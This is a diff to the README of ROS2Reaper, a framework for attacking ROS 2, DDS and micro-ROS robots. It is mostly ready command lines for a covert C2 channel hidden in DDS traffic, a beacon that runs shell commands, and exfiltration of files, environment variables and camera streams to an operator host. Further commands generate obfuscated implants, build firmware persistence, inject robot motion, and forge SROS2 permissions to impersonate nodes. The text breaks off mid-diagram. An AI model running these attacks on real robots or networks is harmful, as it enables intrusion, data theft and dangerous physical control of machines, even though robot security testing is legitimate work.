@@ -9,10 +9,10 @@
   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
 ```
 
-**DDS/RTPS + ROS 1 + ICS/OT Bridge Offensive Security Assessment Framework**
+**DDS/RTPS + ROS 1 + ICS/OT Bridge + Post-Exploitation C2 + micro-ROS/XRCE Offensive Security Assessment Framework**
 
-> Author: Gh057x | v0.4.0-alpha
-> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT)
+> Author: Gh057x | v0.5.0-alpha
+> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52)
 
 ---
 
@@ -33,13 +33,18 @@
 
 ROS2Reaper is a modular offensive security toolkit for assessing ROS 2 and ROS 1 robotic deployments. It targets the underlying DDS/RTPS transport layer — the communication backbone of ROS 2 — as well as the legacy ROS 1 rosmaster XML-RPC interface.
 
-The framework is split into three phases:
+The framework is split into five phases covering the full attack lifecycle — from initial recon to persistent post-exploitation:
 
 | Phase | Description |
 |-------|-------------|
 | **Phase 1 — Reconnaissance** | Passive/active discovery, fingerprinting, enumeration, and security auditing |
 | **Phase 2 — Exploitation** | Topic injection, node impersonation, RTPS amplification, and parameter manipulation |
 | **Phase 3 — ICS/OT Bridge Analysis** | Attack surface analysis for DDS bridges to Modbus, DNP3, OPC UA, MQTT, EtherCAT, and AWS IoT Greengrass |
+| **Phase 4 — Post-Exploitation / C2** | Covert command-and-control channel tunneled inside DDS/RTPS traffic, persistent beaconing, and data exfiltration |
+| **Phase 5A — micro-ROS / XRCE** | XRCE Agent discovery, traffic profiling, client hijacking, implant generation, firmware persistence, and C2 dispatching for embedded micro-ROS targets |
+| **Phase 5B — SROS2/DDS-Security** | DDS-Security handshake interception, X.509 certificate harvesting, governance/permissions policy analysis + forgery, and secured domain infiltration (downgrade / eavesdrop / impersonate) |
+| **Phase 5C — Nav2 + ros2_control** | Navigation stack lifecycle attacks, costmap/sensor data poisoning, behavior tree hijacking, and ros2_control hardware interface exploitation |
+| **Phase 6 — Edge AI / Perception** | AI inference service enumeration, adversarial perturbation generation + DDS injection, black-box model extraction, and ML model backdooring/swap |
 
 ---
 
@@ -65,13 +70,40 @@ ros2reaper_framework/
     ├── ros1_injection.py      # ROS1 TCPROS topic injection
     ├── ros1_exploitation.py   # ROS1 node killing & parameter manipulation
     ├── ros1_audit.py          # ROS1 security configuration auditing
-    └── phase3/
-        ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
-        ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
-        ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
-        ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
-        ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
-        └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
+    ├── phase3/
+    │   ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
+    │   ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
+    │   ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
+    │   ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
+    │   ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
+    │   └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
+    ├── phase4/
+    │   ├── c2_channel.py          # Covert DDS/RTPS C2 transport layer
+    │   ├── c2_server.py           # Operator C2 server + interactive shell
+    │   ├── c2_beacon.py           # Implant deployed on compromised ROS 2 hosts
+    │   └── c2_exfil.py            # Chunked data exfiltration over covert channel
+    ├── phase5a/
+    │   ├── microros_agent.py      # XRCE Agent discovery & participant enumeration
+    │   ├── xrce_traffic_analysis.py # XRCE traffic capture & behavioral profiling
+    │   ├── microros_client_hijack.py # XRCE client spoofing & topic injection
+    │   ├── microros_implant.py    # C2 implant source generator (C++/Arduino/Python)
+    │   ├── microros_persistence.py # Firmware-level persistence mechanisms
+    │   └── c2_dispatcher.py       # Operator C2 dispatcher for implants/agents
+    ├── phase5b/
+    │   ├── dds_security_interceptor.py # DDS-Security handshake intercept & token extraction
+    │   ├── cert_harvester.py      # X.509 certificate harvesting, keystore enum & weakness scoring
+    │   ├── policy_subverter.py    # Governance/permissions analysis, bypass & forgery
+    │   └── domain_infiltrator.py  # Secured domain entry (downgrade/eavesdrop/impersonate)
+    ├── phase5c/
+    │   ├── nav2_lifecycle_attack.py   # Nav2 lifecycle state machine exploitation
+    │   ├── costmap_poisoner.py        # Costmap / sensor data injection & service attacks
+    │   ├── behavior_tree_hijacker.py  # BT goal cancellation, redirect, recovery loop, BT forge
+    │   └── ros2_control_exploit.py    # ros2_control trajectory injection, controller switching
+    └── phase6/
+        ├── ai_model_enumerator.py     # Triton/TF Serving/MLflow/ROS 2 AI service discovery
+        ├── adversarial_perturbation.py # FGSM/PGD/UAP/patch generation + DDS topic injection
+        ├── model_extractor.py         # Black-box model fingerprinting, timing side-channel
+        └── model_poisoner.py          # Triton model swap, ONNX backdoor injection, param inject
 ```
 
 ---
@@ -84,12 +116,14 @@ cd ros2reaper_framework
 pip install -r requirements.txt
 ```
 
-> ROS 2 exploitation modules (`inject`, `impersonate`) require `rclpy` and a sourced ROS 2 environment. All Phase 1 and Phase 3 modules work with no ROS dependency.
+> ROS 2 exploitation modules (`inject`, `impersonate`) require `rclpy` and a sourced ROS 2 environment. All Phase 1, Phase 3, and Phase 4 modules work with no ROS dependency.
 >
 > Phase 3 optional dependencies (all gracefully degraded if missing):
 > ```bash
 > pip install shodan paho-mqtt pymodbus requests asyncua
 > ```
+>
+> Phase 4 has no additional dependencies — pure Python 3.8+ stdlib only.
 
 ---
 
@@ -498,6 +532,1052 @@ python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 --deep -o modbus.json --
 python3 ros2reaper.py mqtt-scan   --network 10.0.0.0/24 --deep -o mqtt.json   --skip-auth
 python3 ros2reaper.py opcua-scan  --network 10.0.0.0/24 --deep -o opcua.json  --skip-auth
 python3 ros2reaper.py aws-scan    --network 10.0.0.0/24 --deep -o aws.json    --skip-auth
+```
+
+---
+
+---
+
+## Phase 4 — Post-Exploitation / C2
+
+> No ROS 2 installation required on the operator side. All modules operate at raw UDP/RTPS level. The beacon side requires Python 3.8+ on the compromised host.
+
+Phase 4 implements a covert command-and-control channel tunneled inside legitimate DDS/RTPS traffic. C2 packets are XOR-encoded and embedded in standard RTPS DATA submessages that mimic normal ROS 2 infrastructure topics (`/rosout`, `/diagnostics`, `/parameter_events`). The channel is invisible to network monitors that don't perform deep RTPS inspection.
+
+**Architecture:**
+
+```
+Operator Machine                     Compromised ROS 2 Host
+┌─────────────┐   covert DDS/RTPS   ┌──────────────────────┐
+│  c2-server  │ ◄──────────────────► │     c2-beacon        │
+│ (operator   │     disguised as     │  (implant, checks in │
+│   shell)    │   /rosout traffic    │   every N seconds)   │
+└─────────────┘                      └──────────────────────┘
+```
+
+**Covert channel design:**
+- Payloads XOR-encoded and wrapped in valid RTPS DATA submessages
+- GUID prefix rotated per session — no persistent fingerprint
+- Beacon interval jittered ±25% to defeat timing analysis
+- Masquerades as eProsima Fast DDS (most common ROS 2 middleware)
+
+---
+
+### `c2-server` — Operator C2 Server
+
+Listens for beacon check-ins, tracks active sessions, and provides an interactive shell for tasking.
+
+```bash
+# Start C2 server on domain 0
+python3 ros2reaper.py c2-server --domain-id 0 --skip-auth
+
+# With custom key and session export on exit
+python3 ros2reaper.py c2-server --domain-id 0 --c2-key mysecretkey -o c2_report.json --skip-auth
+```
+
+**Interactive shell commands:**
+
+```
+sessions                      List all active sessions
+use <session_id>              Set active session (partial ID match)
+info                          Show active session details
+results                       Show task results for active session
+
+task shell <cmd>              Run shell command on compromised host
+task sysinfo                  Collect hostname, OS, ROS env info
+task ros_enum                 Enumerate ROS 2 nodes/topics/params
+task topic_read <topic>       Read messages from a ROS topic
+
+kill                          Send KILL signal — terminate the beacon
+export <file.json>            Export all sessions and results to JSON
+exit                          Stop server
+```
+
+---
+
+### `c2-beacon` — Implant / Beacon
+
+Deployed on a compromised ROS 2 host after initial access. Checks in with the C2 server at a jittered interval, delivers task results, and receives new tasking.
+
+```bash
+# Basic beacon — check in every 30s
+python3 ros2reaper.py c2-beacon --target <c2_server_ip> --skip-auth
+
+# Custom interval + TTL (self-terminate after 20 check-ins)
+python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-interval 20 --c2-ttl 20 --skip-auth
+
+# Custom encryption key (must match server)
+python3 ros2reaper.py c2-beacon --target <c2_server_ip> --c2-key mysecretkey --skip-auth
+```
+
+Supported tasks (delivered from `c2-server`):
+
+| Task | Description |
+|------|-------------|
+| `shell` | Execute arbitrary shell command, return stdout/stderr |
+| `sysinfo` | Collect hostname, user, PID, ROS distro, domain ID |
+| `ros_enum` | Enumerate ROS 2 nodes, topics, and parameters via CLI |
+| `topic_read` | Read messages from a specified ROS 2 topic |
+
+---
+
+### `c2-exfil` — Data Exfiltration
+
+Collects data on the compromised host and streams it to the C2 server via chunked EXFIL packets over the covert channel. Large payloads are automatically split into 1400-byte chunks (stays within UDP MTU) and reassembled on the operator side.
+
+```bash
+# Exfiltrate environment variables
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode env --skip-auth
+
+# Exfiltrate a file from the target filesystem
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode files --exfil-path /etc/hosts --skip-auth
+
+# Dump all ROS 2 parameter values
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode params --skip-auth
+
+# Capture and exfiltrate a ROS topic stream
+python3 ros2reaper.py c2-exfil --target <c2_server_ip> --exfil-mode topic --topic /camera/image_raw --skip-auth
+```
+
+Exfil modes:
+
+| Mode | Description |
+|------|-------------|
+| `env` | All environment variables and ROS configuration |
+| `files` | Read a file from the target filesystem (up to 64KB) |
+| `params` | Dump all ROS 2 parameter values across all nodes |
+| `topic` | Capture and stream a ROS 2 topic for 10 seconds |
+
+---
+
+### `c2-recv` — Exfil Receiver
+
+Listens on the operator side and reassembles chunked exfil data from a specific session.
+
+```bash
+# Receive exfil and print to stdout
+python3 ros2reaper.py c2-recv --c2-session <session_id> --skip-auth
+
+# Save to file
+python3 ros2reaper.py c2-recv --c2-session <session_id> -o stolen_data.bin --skip-auth
+
+# Longer timeout for large payloads
+python3 ros2reaper.py c2-recv --c2-session <session_id> --timeout 120 -o output.txt --skip-auth
+
+---
+
+## Phase 5A — micro-ROS / XRCE
+
+> No ROS installation required. All Phase 5A modules operate at the raw UDP/socket level using the XRCE wire format.
+
+Phase 5A targets embedded micro-ROS deployments — constrained MCU-based nodes (Arduino, STM32, ESP32, nRF52) that communicate via the DDS-XRCE (eXtremely Resource Constrained Environments) protocol through a micro-ROS Agent bridge.
+
+**XRCE default ports:** UDP/8888 (standard), UDP/7400–7409 (alternative instances)
+
+**Phase 5A options:**
+
+| Flag | Description |
+|------|-------------|
+| `--agent-port` | XRCE Agent UDP port (default: 8888) |
+| `--xrce-multiport` | Scan common XRCE ports (8888, 7400–7409) |
+| `--xrce-enumerate` | Enumerate micro-ROS participants on discovered agents |
+| `--xrce-attack` | Hijack attack type: `twist`, `nav`, `raw` |
+| `--xrce-session` | Spoofed session ID in hex (default: 0x42) |
+| `--pcap` | Export captured XRCE traffic to PCAP file |
+| `--theta` | Nav goal orientation in radians (default: 0.0) |
+| `--interval` | Delay between injections in seconds (default: 0.1) |
+| `--payload-file` | Raw XRCE payload file (hex text) for raw injection |
+| `--payload-hex` | Raw XRCE payload as hex string |
+| `--platform` | Implant platform: `cpp`, `arduino`, `python` |
+| `--implant-id` | Implant ID (auto-generated if omitted) |
+| `--beacon-interval` | Implant beacon interval in ms (default: 5000) |
+| `--beacon-topic` | Beacon topic base (default: `/implant/beacon`) |
+| `--command-topic` | Command topic base (default: `/implant/command`) |
+| `--obfuscate` | Strip comments from generated implant source |
+| `--add-decoy` | Add decoy code to generated implant |
+| `--manifest` | Export implant generation manifest to JSON |
+| `--persist-method` | Persistence method: `library_patch`, `bootloader`, `firmware_inject`, `partition`, `ota_hijack` |
+| `--implant-file` | Binary file with implant shellcode for persistence |
+| `--implant-hex` | Implant shellcode as hex string |
+| `--hook-address` | Bootloader hook address (hex, e.g. `0x08000100`) |
+| `--partition-name` | Partition name for ESP32 partition hijack |
+| `--ota-server` | OTA server for hijack config generation |
+| `--dispatcher-port` | Phase 5A dispatcher callback port |
+| `--beacon-timeout` | Implant beacon timeout in seconds (default: 60.0) |
+| `--log-file` | Dispatcher log file path |
+| `--export-session` | Export dispatcher session state to JSON |
+| `--batch-file` | Run dispatcher commands from file (non-interactive) |
+
+---
+
+### `microros-agent` — XRCE Agent Discovery & Enumeration
+
+Probes for XRCE Agents using minimal HEARTBEAT packets and fingerprints vendor/version from responses. Optionally enumerates connected micro-ROS participants (MCU clients).
+
+```bash
+# Single target
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --skip-auth
+
+# Network sweep
+python3 ros2reaper.py microros-agent --network 10.0.0.0/24 --skip-auth -o agents.json
+
+# Scan all common XRCE ports on a single host
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-multiport --skip-auth
+
+# Discover agents + enumerate connected MCU participants
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-enumerate --skip-auth
+
+# Custom XRCE port
+python3 ros2reaper.py microros-agent --target 10.0.0.5 --agent-port 7400 --skip-auth
+```
+
+---
+
+### `xrce-traffic` — XRCE Traffic Analysis & Behavioral Profiling
+
+Captures live XRCE traffic and builds a behavioral baseline: packet size distributions, inter-packet timing, heartbeat intervals, QoS patterns, and per-session/stream statistics. Used to time and size subsequent injections to blend with normal traffic.
+
+```bash
+# 30-second capture baseline
+python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --duration 30 --skip-auth
+
+# Longer capture with JSON + PCAP export
+python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --agent-port 8888 \
+    --duration 60 -o baseline.json --pcap capture.pcap --skip-auth -v
+```
+
+---
+
+### `xrce-hijack` — XRCE Client Hijacking & Command Injection
+
+Creates a spoofed XRCE client session against a discovered Agent and injects malicious DDS messages. Supports Twist (velocity), PoseStamped (navigation goal), and raw CDR payload injection.
+
+| Mode | Description |
+|------|-------------|
+| `twist` | Inject `geometry_msgs/Twist` — robot velocity control |
+| `nav` | Inject `geometry_msgs/PoseStamped` — navigation goal |
+| `raw` | Inject arbitrary CDR-encoded payload from hex or file |
+
+```bash
+# Inject cmd_vel spin (default topic /cmd_vel)
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack twist \
+    --lx 0.5 --az 1.0 --count 20 --interval 0.1 --skip-auth
+
+# Navigate robot to coordinates
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack nav \
+    --topic /move_base_simple/goal --x 15.0 --y 8.0 --skip-auth
+
+# Raw payload injection (custom CDR message)
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack raw \
+    --topic /cmd_vel --payload-hex 0000803f000000000000000000000000000000000000803f \
+    --count 5 --skip-auth
+
+# Use specific session ID and custom port
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --agent-port 7400 \
+    --xrce-session 0x81 --xrce-attack twist --lx 2.0 --skip-auth
+```
+
+---
+
+### Phase 4 Attack Workflow
+
+Full post-exploitation flow following a successful Phase 2 compromise:
+
+```bash
+# 1. Start C2 server on operator machine
+python3 ros2reaper.py c2-server --domain-id 0 --c2-key opskey -o session_log.json --skip-auth
+
+# 2. Deploy beacon on compromised ROS 2 host (runs on the target)
+python3 ros2reaper.py c2-beacon --target <operator_ip> --c2-key opskey --c2-interval 15 --skip-auth
+
+# 3. In the c2-server shell:
+#    sessions                         ← see the new session appear
+#    use <session_id>
+#    task sysinfo                     ← fingerprint the host
+#    task ros_enum                    ← map the ROS graph
+#    task shell ros2 topic list       ← arbitrary command execution
+#    task topic_read /cmd_vel         ← intercept velocity commands
+
+# 4. Exfiltrate from the compromised host
+python3 ros2reaper.py c2-exfil --target <operator_ip> --c2-key opskey --exfil-mode params --skip-auth
+
+# 5. Receive on operator side
+python3 ros2reaper.py c2-recv --c2-session <session_id> --c2-key opskey -o ros_params.txt --skip-auth
+
+---
+
+### `uros-implant` — micro-ROS C2 Implant Generation
+
+Generates complete micro-ROS C2 implant source code from templates. The implant beacons periodically to a C2 callback topic and accepts tasking commands over DDS. Supports three target platforms.
+
+| Platform | Output | Use case |
+|----------|--------|----------|
+| `cpp` | `.cpp` (ROS 2 node) | Full ROS 2 host or cross-compiled MCU |
+| `arduino` | `.ino` (Arduino sketch) | Arduino-compatible boards with Ethernet/WiFi |
+| `python` | `.py` (rclpy node) | Rapid prototyping / testing |
+
+```bash
+# Generate Python implant (lab testing)
+python3 ros2reaper.py uros-implant --platform python --skip-auth
+
+# Generate Arduino implant with custom beacon interval
+python3 ros2reaper.py uros-implant --platform arduino \
+    --implant-id sensor_node_01 --beacon-interval 3000 --skip-auth
+
+# Generate C++ implant with obfuscation + manifest
+python3 ros2reaper.py uros-implant --platform cpp --obfuscate --add-decoy \
+    --beacon-interval 10000 --manifest implants.json --skip-auth
+```
+
+---
+
+### `uros-persist` — Firmware-Level Persistence
+
+Establishes persistent implant presence at the firmware level. Generates patched firmware images, bootloader hooks, partition table modifications, or OTA hijack configurations.
+
+| Method | Survives | Notes |
+|--------|----------|-------|
+| `library_patch` | App reinstalls | Injects beacon into micro-ROS client library |
+| `bootloader` | OS wipe | Hooks bootloader to run implant before firmware |
+| `firmware_inject` | Normal updates | Appends implant to firmware image |
+| `partition` | Factory reset | Creates hidden partition in ESP32 partition table |
+| `ota_hijack` | Updates (MITM) | Generates config for serving malicious OTA firmware |
+
+```bash
+# Library patch (micro-ROS .elf firmware)
+python3 ros2reaper.py uros-persist --persist-method library_patch \
+    --target firmware.elf --implant-id sensor_01 \
+    --implant-hex deadbeef... --skip-auth -o persist.json
+
+# ESP32 partition hijack
+python3 ros2reaper.py uros-persist --persist-method partition \
+    --target partitions.csv --implant-id sensor_01 \
+    --implant-file implant.bin --partition-name implant_hidden --skip-auth
+
+# OTA hijack config generation
+python3 ros2reaper.py uros-persist --persist-method ota_hijack \
+    --implant-id sensor_01 --ota-server ota.target.local --skip-auth
+
+# Bootloader hook with specific hook address
+python3 ros2reaper.py uros-persist --persist-method bootloader \
+    --target bootloader.elf --implant-id sensor_01 \
+    --implant-file implant.bin --hook-address 0x08000100 --skip-auth
+```
+
+---
+
+### `uros-c2` — Phase 5A C2 Dispatcher
+
+Interactive operator console that routes commands to deployed micro-ROS implants (via DDS topics) or live XRCE Agents (via Module 3 hijacking). Tracks the implant registry, manages task queues, and aggregates telemetry.
+
+```bash
+# Start interactive dispatcher
+python3 ros2reaper.py uros-c2 --skip-auth
+
+# With C2 callback and logging
+python3 ros2reaper.py uros-c2 --target 10.0.0.1 --dispatcher-port 9999 \
+    --beacon-timeout 120 --log-file dispatcher.log --skip-auth
+
+# Batch mode — run commands from file
+python3 ros2reaper.py uros-c2 --batch-file tasks.txt \
+    --export-session session.json --skip-auth
+```
+
+**Dispatcher commands (interactive console):**
+
+```
+[dispatcher]> action uros_abc123 inject_twist lx=2.0 az=1.0
+[dispatcher]> action uros_abc123 inject_nav x=10.0 y=5.0
+[dispatcher]> action 10.0.0.5 inject_twist lx=5.0 port=8888
+[dispatcher]> status implants
+[dispatcher]> status implants uros_abc123
+[dispatcher]> status tasks
+[dispatcher]> help
+```
+
+---
+
+### Phase 5A Pipeline
+
+Full micro-ROS assessment and exploitation workflow:
+
+```bash
+# 1. Discover XRCE Agents on the subnet
+python3 ros2reaper.py microros-agent --network 10.0.0.0/24 \
+    --xrce-enumerate -o agents.json --skip-auth
+
+# 2. Build behavioral baseline (30s passive capture)
+python3 ros2reaper.py xrce-traffic --target 10.0.0.5 \
+    --duration 30 -o baseline.json --pcap xrce.pcap --skip-auth
+
+# 3. Hijack session and inject velocity command
+python3 ros2reaper.py xrce-hijack --target 10.0.0.5 \
+    --xrce-attack twist --lx 1.5 --az 0.5 --count 10 --skip-auth
+
+# 4. Generate persistent implant
+python3 ros2reaper.py uros-implant --platform python \
+    --implant-id lab_node_01 --beacon-interval 5000 --skip-auth
+
+# 5. Start C2 dispatcher and receive implant beacons
+python3 ros2reaper.py uros-c2 --log-file lab_session.log --skip-auth
+```
+
+---
+
+## Phase 5B — SROS2/DDS-Security Subversion
+
+> No ROS installation required. All Phase 5B modules operate at the raw socket level. The `sros2-policy --forge` command requires `openssl` in `PATH` for signing. Certificate parsing uses pure Python (no `cryptography` dependency).
+
+Phase 5B targets the **DDS-Security (SROS2) authentication and access control layer** — the primary defense mechanism for secured ROS 2 deployments. It intercepts security handshakes, extracts X.509 certificates, subverts governance/permissions policies, and uses harvested material to infiltrate secured domains.
+
+**Phase 5B options:**
+
+| Flag | Description |
+|------|-------------|
+| `--from-intercept` | `sros2-harvest`: parse identity tokens from `sros2-intercept` JSON output |
+| `--keystore-path` | `sros2-harvest`: explicit SROS2 keystore root path |
+| `--governance` | `sros2-policy`: path to `governance.xml` or `governance.p7s` |
+| `--permissions` | `sros2-policy`: path to `permissions.xml` or `permissions.p7s` |
+| `--ca-cert` | `sros2-policy`: CA certificate PEM for forgery signing |
+| `--ca-key` | `sros2-policy`: CA private key PEM for forgery signing |
+| `--forge-policy` | `sros2-policy`: generate forged governance + permissions documents |
+| `--forged-output` | `sros2-policy`: save forged `permissions.xml` to file |
+| `--subject-name` | Subject DN for forged certificate |
+| `--cert-file` | `sros2-infiltrate`: node certificate PEM (impersonate mode) |
+| `--permissions-file` | `sros2-infiltrate`: signed `permissions.p7s` (impersonate mode) |
+| `--infiltrate-mode` | `sros2-infiltrate`: `downgrade`, `eavesdrop`, or `impersonate` |
+| `--spoof-node-name` | `sros2-infiltrate`: spoofed DDS participant name |
+| `--interface` | `sros2-intercept`: network interface IP for multicast binding |
+
+---
+
+### `sros2-intercept` — DDS-Security Handshake Interception
+
+Passively captures RTPS SPDP traffic containing DDS-Security identity tokens, permissions tokens, and security attribute bitmasks. Maps the domain's authentication strategy (ENFORCE vs. PERMISSIVE) and identifies SIGN-only nodes whose topic data is readable in plaintext.
+
+Zero packets sent — full stealth mode.
+
+```bash
+# Listen on domain 0 for 60 seconds
+python3 ros2reaper.py sros2-intercept --domain-id 0 --duration 60 --skip-auth
+
+# Target specific host
+python3 ros2reaper.py sros2-intercept --target 192.168.1.100 --duration 30 -o tokens.json --skip-auth
+```
+
+Output includes:
+- Per-participant security posture (identity token class_id, RTPS/submsg/payload protection modes)
+- Downgrade candidates (no RTPS protection → Phase 2 injectable)
+- SIGN-only participants (payload visible in plaintext)
+- Domain authentication strategy (ENFORCE / PERMISSIVE)
+- Token binary properties (certificate property names for downstream harvesting)
+
+---
+
+### `sros2-harvest` — X.509 Certificate & Key Material Extraction
+
+Extracts and analyzes X.509 certificates from two sources:
+1. **Network tokens** — identity tokens captured by `sros2-intercept` (Module 1)
+2. **Filesystem keystores** — SROS2 keystore trees (created by `ros2 security create_keystore`)
+
+Scores certificate weaknesses with CVSS ratings and identifies rogue CA and node impersonation opportunities.
+
+```bash
+# Scan filesystem for SROS2 keystores
+python3 ros2reaper.py sros2-harvest --skip-auth
+
+# Explicit keystore path
+python3 ros2reaper.py sros2-harvest --keystore-path /opt/ros/keystore -o harvest.json --skip-auth
+
+# Parse tokens from intercept output (Module 1)
+python3 ros2reaper.py sros2-harvest --from-intercept tokens.json --skip-auth
+```
+
+Weakness scoring:
+
+| Finding | Severity | CVSS | Attack Scenario |
+|---------|----------|------|-----------------|
+| CA private key accessible | CRITICAL | 10.0 | Sign forged node certs → impersonate ANY node |
+| Node private key accessible | CRITICAL | 9.8 | Direct node identity impersonation |
+| Expired certificate | HIGH | 7.5 | Accepted by lenient agents with clock drift |
+| Self-signed CA | HIGH | 7.0 | Forge matching-DN CA → bypass chain validation |
+| RSA < 2048 bits | HIGH | 7.0 | Offline key factoring |
+| SHA-1 signature | MEDIUM | 6.5 | Certificate collision (SHAttered) |
+
+---
+
+### `sros2-policy` — Governance/Permissions Policy Analysis & Forgery
+
+Parses SROS2 `governance.xml` and `permissions.xml` (including S/MIME-wrapped `.p7s` files) for security misconfigurations. Optionally generates forged policy documents and signs them with an extracted CA key.
+
+```bash
+# Analyze governance + permissions
+python3 ros2reaper.py sros2-policy \
+  --governance /opt/ros/keystore/enclaves/robot1/governance.p7s \
+  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
+  --skip-auth
+
+# Generate forged unrestricted permissions (unsigned)
+python3 ros2reaper.py sros2-policy \
+  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
+  --forge-policy \
+  --subject-name "CN=attacker,O=TargetOrg" \
+  --forged-output forged_permissions.xml \
+  --skip-auth
+
+# Generate AND sign forged permissions with extracted CA key
+python3 ros2reaper.py sros2-policy \
+  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
+  --forge-policy \
+  --ca-cert /opt/ros/keystore/public/ca.cert.pem \
+  --ca-key /opt/ros/keystore/private/ca.key.pem \
+  --subject-name "CN=attacker,O=TargetOrg" \
+  -o policy_analysis.json \
+  --skip-auth
+```
+
+Key findings detected:
+
+| Check | Severity | Description |
+|-------|----------|-------------|
+| `GOV-001` | CRITICAL | `allow_unauthenticated_participants=true` (PERMISSIVE mode) |
+| `GOV-002` | HIGH | `enable_join_access_control=false` (any cert joins) |
+| `GOV-003` | HIGH | `rtps_protection_kind=SIGN` (plaintext payload) |
+| `GOV-005a` | CRITICAL | `enable_write_access_control=false` on topic |
+| `PERM-001` | CRITICAL | Wildcard `subject_name=*` in grant |
+| `PERM-002` | HIGH | `default=ALLOW` (implicit topic access) |
+| `PERM-003a` | HIGH | Wildcard publish topic `*` |
+
+---
+
+### `sros2-infiltrate` — Secured Domain Entry
+
+Active exploitation module. Joins a secured DDS domain using material gathered by the previous modules.
+
+**Three modes:**
+
+| Mode | Prerequisite | Description |
+|------|--------------|-------------|
+| `downgrade` | `GOV-001` (PERMISSIVE) | Announce unsecured SPDP participant — domain accepts without auth |
+| `eavesdrop` | `GOV-003` (SIGN-only) | Passive capture + CDR decode of plaintext topic payloads |
+| `impersonate` | `cert.pem` + `key.pem` | Announce with harvested identity token — join as existing node |
+
+```bash
+# Downgrade attack — join PERMISSIVE domain without credentials
+python3 ros2reaper.py sros2-infiltrate \
+  --infiltrate-mode downgrade \
+  --target 192.168.1.100 \
+  --domain-id 0 \
+  --duration 30 \
+  --spoof-node-name robot_controller \
+  --skip-auth
+
+# Eavesdrop on SIGN-only domain (no encryption, payloads readable)
+python3 ros2reaper.py sros2-infiltrate \
+  --infiltrate-mode eavesdrop \
+  --domain-id 0 \
+  --duration 60 \
+  -o eavesdrop.json \
+  --skip-auth
+
+# Impersonate node using harvested certificates
+python3 ros2reaper.py sros2-infiltrate \
+  --infiltrate-mode impersonate \
+  --target 192.168.1.100 \
+  --cert-file /opt/ros/keystore/enclaves/robot1/cert.pem \
+  --permissions-file forged_permissions.p7s \
+  --subject-name "CN=robot1,O=RobotCorp" \
+  --domain-id 0 \
+  --skip-auth
+```
+
+---
+
+### Phase 5B Pipeline
+
+Full SROS2 subversion workflow:
+
+```bash
+# 1. Intercept DDS-Security traffic — identify domain posture and capture tokens
+python3 ros2reaper.py sros2-intercept --domain-id 0 --duration 60 -o tokens.json --skip-auth
+
+# 2. Harvest certificates — extract from keystore or network tokens
+python3 ros2reaper.py sros2-harvest --from-intercept tokens.json -o harvest.json --skip-auth
+# OR (if shell access from Phase 5A implant)
+python3 ros2reaper.py sros2-harvest --keystore-path /opt/ros/keystore -o harvest.json --skip-auth
+
+# 3. Analyze policies and forge if CA key available
+python3 ros2reaper.py sros2-policy \
+  --governance /opt/ros/keystore/enclaves/robot1/governance.p7s \
+  --permissions /opt/ros/keystore/enclaves/robot1/permissions.p7s \
+  --forge-policy \
+  --ca-cert /opt/ros/keystore/public/ca.cert.pem \
+  --ca-key /opt/ros/keystore/private/ca.key.pem \
+  --subject-name "CN=attacker_node,O=TargetOrg" \
+  -o policy.json --skip-auth
+
+# 4. Infiltrate secured domain
+python3 ros2reaper.py sros2-infiltrate \
+  --infiltrate-mode impersonate \
+  --target 192.168.1.100 \
+  --cert-file /opt/ros/keystore/enclaves/robot1/cert.pem \
+  --permissions-file forged_permissions.p7s \
+  --skip-auth
+
+# 5. Now in domain — run Phase 2 injection as "secured" node
+python3 ros2reaper.py inject --namespace /robot1 --preset spin --domain-id 0 --skip-auth
+```
+
+---
+
+## Phase 5C — Nav2 + ros2_control / Hardware Interface Layer
+
+> Full attack capability requires `rclpy` and the target ROS 2 distribution. Enumeration, BT XML generation, and raw RTPS injection work without ROS 2 installed.
+
+Phase 5C targets the **navigation and hardware control plane** of a ROS 2 robot — the layer above raw topics (Phase 2) that governs *how* the robot makes decisions and *how* those decisions reach the physical actuators.
+
+**Architecture targeted:**
+
+```
+NavigateToPose goal
+   └─► bt_navigator (BT executor) ──► ComputePathToPose ──► planner_server
+                │                 └─► FollowPath ──► controller_server
+                │                 └─► Recovery (Spin / BackUp / Wait)
